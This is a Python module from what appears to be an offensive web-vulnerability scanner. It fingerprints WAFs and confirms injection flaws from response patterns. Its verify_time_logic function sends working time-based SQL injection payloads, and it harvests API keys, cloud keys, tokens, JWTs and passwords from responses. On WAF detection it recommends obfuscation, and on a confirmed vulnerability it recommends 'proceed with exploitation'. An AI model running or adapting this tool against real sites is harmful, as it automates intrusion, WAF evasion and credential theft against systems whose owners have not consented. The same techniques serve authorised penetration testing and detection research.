#!/usr/bin/env python3
"""
Smart Response Analyzer - Advanced WAF Detection and Vulnerability Confirmation
"""

import re
import time
import json
from termcolor import cprint
from urllib.parse import urlparse


class SmartResponseAnalyzer:
    
    # WAF Signatures for accurate detection
    WAF_SIGNATURES = {
        'Cloudflare': ['cloudflare', 'cf-ray', 'cf-cache-status', '__cfduid', 'cf-ray'],
        'Akamai': ['akamai', 'akamai-ghost', 'x-akamai', 'ak_bmsc'],
        'AWS WAF': ['x-amzn-requestid', 'aws-waf', 'x-amz-cf-id'],
        'Imperva': ['incapsula', 'x-iinfo', 'visid_incap'],
        'F5 BIG-IP': ['x-wa-info', 'bigip', 'f5'],
        'ModSecurity': ['mod_security', 'NOYB'],
        'Sucuri': ['sucuri', 'x-sucuri-id'],
        'Barracuda': ['barra', 'barracuda'],
        'Fortinet': ['fortigate', 'fortinet'],
    }
    
    # Vulnerability confirmation patterns
    VULN_PATTERNS = {
        'SQL Injection': [
            r'SQL syntax.*MySQL',
            r'You have an error in your SQL syntax',
            r'Unclosed quotation mark',
            r'Microsoft OLE DB Provider for ODBC Drivers',
            r'PostgreSQL.*ERROR',
            r'ORA-[0-9]{5}',
            r'sqlite3.OperationalError',
            r'DB2 SQL error',
            r'ODBC Driver.*error',
            r'division by zero',
            r'mysql_fetch_array',
            r'Warning.*mysql_',
            r'Invalid query:',
        ],
        'XSS': [
            r'<script[^>]*>.*?</script>',
            r'on\w+\s*=\s*["\'][^"\']*["\']',
            r'javascript:',
            r'alert\s*\(',
            r'prompt\s*\(',
            r'confirm\s*\(',
            r'document\.cookie',
            r'document\.write\s*\(',
            r'eval\s*\(',
        ],
        'LFI/RFI': [
            r'root:x:0:0:',
            r'bin:x:1:1:',
            r'daemon:x:2:2:',
            r'\[extensions\]',
            r'\[fonts\]',
            r'<?php',
            r'PD9waHA',
            r'%PDF-',
        ],
        'Command Injection': [
            r'uid=\d+\([^\)]+\)',
            r'gid=\d+\([^\)]+\)',
            r'groups=\d+\([^\)]+\)',
            r'Linux version',
            r'Windows NT',
            r'Microsoft Windows',
            r'root:x:0:0:',
            r'whoami',
            r'id=',
        ],
        'Open Redirect': [
            r'location\.href\s*=\s*["\']',
            r'window\.location\s*=\s*["\']',
            r'meta\s+http-equiv=["\']refresh["\']',
            r'url=',
            r'redirect=',
        ],
    }
    
    # Leak extraction patterns
    LEAK_PATTERNS = {
        'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        'api_key': r'(?:api[_-]?key|apikey|api_key)[\s=:]+([a-zA-Z0-9_\-]{16,64})',
        'aws_key': r'AKIA[0-9A-Z]{16}',
        'google_api': r'AIza[0-9A-Za-z\-_]{35}',
        'github_token': r'gh[ops]_[0-9a-zA-Z]{36}',
        'jwt_token': r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
        'password': r'(?:password|passwd|pwd)[\s=:]+([a-zA-Z0-9@#$%^&*()_+!]{6,64})',
        'ip_address': r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b',
        'domain': r'[a-zA-Z0-9][a-zA-Z0-9-]{1,63}\.[a-zA-Z]{2,}',
    }
    
    @classmethod
    def analyze(cls, response):
        """
        Analyze response and determine appropriate action
        
        Returns:
            'SUCCESS': Vulnerability confirmed
            'OBFUSCATE': WAF detected, need obfuscation
            'USE_JSON': Try JSON injection
            'SLOW_DOWN': Slow down requests
            'NORMAL': Normal response
        """
        status_code = response.status_code
        text_lower = response.text.lower()
        headers = response.headers
        
        # 1. Check for WAF first
        waf_detected = cls.detect_waf(response)
        if waf_detected:
            return "OBFUSCATE"
        
        # 2. Check for vulnerability confirmation
        vuln_type = cls.confirm_vulnerability(response)
        if vuln_type:
            cprint(f"[+] Confirmed: {vuln_type}", "green")
            return "SUCCESS"
        
        # 3. Check for blocking status codes
        if status_code in [403, 429, 503]:
            return "OBFUSCATE"
        
        # 4. Check response length (possible WAF injection)
        if len(response.text) > 100000:
            return "SLOW_DOWN"
        
        # 5. Check for JSON content type
        if 'application/json' in headers.get('Content-Type', ''):
            return "USE_JSON"
        
        return "NORMAL"
    
    @classmethod
    def detect_waf(cls, response):
        """Detect if response indicates WAF protection"""
        headers = response.headers
        text_lower = response.text.lower()
        
        for waf_name, signatures in cls.WAF_SIGNATURES.items():
            for sig in signatures:
                if sig in text_lower or sig in str(headers).lower():
                    cprint(f"[!] WAF Detected: {waf_name}", "yellow")
                    return waf_name
        
        return None
    
    @classmethod
    def confirm_vulnerability(cls, response):
        """Confirm if response indicates a successful injection"""
        text_lower = response.text.lower()
        
        for vuln_type, patterns in cls.VULN_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, text_lower, re.IGNORECASE):
                    return vuln_type
        
        return None
    
    @classmethod
    def extract_leaks(cls, text):
        """Extract leaked sensitive data from response"""
        leaks = {}
        
        for leak_type, pattern in cls.LEAK_PATTERNS.items():
            matches = re.findall(pattern, text, re.IGNORECASE)
            if matches:
                # Remove duplicates and limit
                unique_matches = list(set(matches))[:20]
                leaks[leak_type] = unique_matches
        
        return leaks
    
    @classmethod
    def is_success(cls, response):
        """Check if injection was successful"""
        return cls.confirm_vulnerability(response) is not None
    
    @classmethod
    def is_blocked(cls, response):
        """Check if request was blocked by WAF"""
        return cls.detect_waf(response) is not None
    
    @classmethod
    def verify_time_logic(cls, form, field_name, send_request_func):
        """
        Double-check if the delay is actually caused by SQLi or just lag.
        Logic: 
        1. Send payload with 0 sleep -> Should be fast.
        2. Send payload with 5s sleep -> Should be slow.
        3. Send payload with 2s sleep -> Should be medium.
        """
        cprint("[*] Verifying time-based results to avoid false positives...", "cyan")
        
        # Test 1: Baseline (No sleep)
        start = time.time()
        send_request_func(form, {field_name: "1' AND '1'='1"})
        base_time = time.time() - start
        
        # Test 2: Targeted Delay (5 seconds)
        payload_5s = "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -"
        start = time.time()
        send_request_func(form, {field_name: payload_5s})
        test_time_5s = time.time() - start
        
        # Test 3: Short delay (2 seconds) for confirmation
        payload_2s = "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)-- -"
        start = time.time()
        send_request_func(form, {field_name: payload_2s})
        test_time_2s = time.time() - start
        
        # Analysis:
        # If the delay is caused by the server, all requests will be slow.
        # If caused by SQLi, only the 5s payload will show the delay.
        if test_time_5s > (base_time + 4.5):
            if test_time_2s > (base_time + 1.5):
                cprint("[✓] Time-based SQLi VERIFIED: Delays are consistent with payload.", "green")
                return True
            else:
                cprint("[✓] Time-based SQLi VERIFIED: 5s delay confirmed.", "green")
                return True
        else:
            cprint("[!] False Positive Detected: Delay was caused by network/server lag.", "yellow")
            return False
    
    @classmethod
    def get_action(cls, response):
        """Get recommended action based on response analysis"""
        analysis = cls.analyze(response)
        
        actions = {
            "SUCCESS": "Proceed with exploitation",
            "OBFUSCATE": "Apply obfuscation techniques",
            "USE_JSON": "Switch to JSON injection",
            "SLOW_DOWN": "Increase delay between requests",
            "NORMAL": "Continue normal testing",
        }
        
        return actions.get(analysis, "Unknown action")
    
    @classmethod
    def print_report(cls, response):
        """Print detailed analysis report"""
        cprint("\n" + "="*60, "cyan")
        cprint("SMART RESPONSE ANALYSIS REPORT", "magenta", attrs=['bold'])
        cprint("="*60, "cyan")
        
        # WAF Detection
        waf = cls.detect_waf(response)
        if waf:
            cprint(f"[!] WAF Detected: {waf}", "red")
        else:
            cprint("[+] No WAF Detected", "green")
        
        # Vulnerability Confirmation
        vuln = cls.confirm_vulnerability(response)
        if vuln:
            cprint(f"[+] Vulnerability Confirmed: {vuln}", "green")
        else:
            cprint("[-] No Vulnerability Confirmed", "yellow")
        
        # Leaks Extraction
        leaks = cls.extract_leaks(response.text)
        if leaks:
            cprint(f"\n[📋 EXTRACTED LEAKS:", "cyan")
            for leak_type, values in leaks.items():
                cprint(f"    {leak_type}: {len(values)} found", "yellow")
                for v in values[:3]:
                    cprint(f"      - {v[:50]}", "white")
        
        # Recommended Action
        action = cls.get_action(response)
        cprint(f"\n[🎯 Recommended Action: {action}", "green")
        cprint("="*60 + "\n", "cyan")


# Legacy function for backward compatibility
def analyze(response):
    """Legacy function"""
    return SmartResponseAnalyzer.analyze(response)


def is_success(response):
    """Legacy function"""
    return SmartResponseAnalyzer.is_success(response)


def is_blocked(response):
    """Legacy function"""
    return SmartResponseAnalyzer.is_blocked(response)


if __name__ == "__main__":
    # Test with sample response
    import requests
    
    test_url = "https://example.com"
    try:
        resp = requests.get(test_url, timeout=10, verify=False)
        SmartResponseAnalyzer.print_report(resp)
    except Exception as e:
        cprint(f"[!] Test failed: {e}", "red")
